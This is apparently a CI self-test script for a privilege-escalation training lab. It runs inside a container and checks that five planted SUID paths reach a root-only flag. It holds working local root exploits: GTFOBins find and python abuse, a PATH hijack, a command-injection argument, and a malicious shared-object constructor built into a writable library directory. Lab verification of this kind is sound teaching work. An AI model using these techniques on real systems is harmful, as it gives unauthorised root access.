#!/usr/bin/env bash
# =============================================================================
#  Road to Root — SUID lab self-test
#
#  Runs every planted SUID path on the "Set & Forget" box and asserts each one
#  reaches root (captures the root-only flag). Also checks the flag is NOT
#  readable without exploiting (so a PASS can't be a false positive).
#
#  Run it as labuser1 INSIDE the target container:
#     docker cp tests/verify_suid.sh target-suid:/tmp/
#     docker exec -u labuser1 target-suid bash /tmp/verify_suid.sh
#
#  Exit code 0 = all paths work. Non-zero = something is broken. (Used by CI.)
# =============================================================================
set -u
FLAG='R2R{'
PASS=0; FAIL=0
pass(){ echo "  [PASS] $1"; PASS=$((PASS + 1)); }
fail(){ echo "  [FAIL] $1"; FAIL=$((FAIL + 1)); }
check(){ if printf '%s' "$2" | grep -q "$FLAG"; then pass "$1"; else fail "$1"; fi; }

echo "== identity =="
id

echo "== control: the flag must NOT be readable as labuser1 =="
if cat /root/flag.txt 2>/dev/null; then
  fail "control — flag is readable without root (setup is broken!)"
else
  pass "control — flag is root-only (Permission denied, as expected)"
fi

echo "== exploiting the five SUID stations =="

# A — GTFOBins: SUID find
A=$(/usr/local/bin/suid-find . -maxdepth 0 -exec /bin/sh -p -c 'cat /root/flag.txt' \; -quit 2>&1)
check "A  SUID find (GTFOBins -exec)" "$A"

# B — GTFOBins: SUID python3 interpreter
B=$(/usr/local/bin/suid-python -c 'import os;os.setuid(0);os.system("cat /root/flag.txt")' 2>&1)
check "B  SUID python interpreter" "$B"

# C — PATH hijack of a custom SUID tool
cd /tmp || exit 2
printf '#!/bin/bash\ncat /root/flag.txt\n' > du && chmod +x du
C=$(PATH=/tmp:$PATH /usr/local/bin/logstats 2>&1)
rm -f /tmp/du
check "C  PATH hijack (logstats)" "$C"

# D — command injection in a custom SUID tool
D=$(/usr/local/bin/logreader 'x; cat /root/flag.txt' 2>&1)
check "D  command injection (logreader)" "$D"

# E — shared-object injection via a world-writable RPATH dir
cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void pwn(void){ setuid(0); setgid(0); system("cat /root/flag.txt"); }
void greet(void){}
EOF
rm -f /opt/lab/lib/libgreet.so
gcc -shared -fPIC -o /opt/lab/lib/libgreet.so /tmp/evil.c
E=$(/usr/local/bin/report 2>&1)
rm -f /tmp/evil.c
check "E  shared-object injection (report)" "$E"

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 6 pass / 0 fail — control + 5 stations)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL SUID PATHS REACH ROOT -- OK"
  exit 0
else
  echo "  SOME PATHS FAILED"
  exit 1
fi
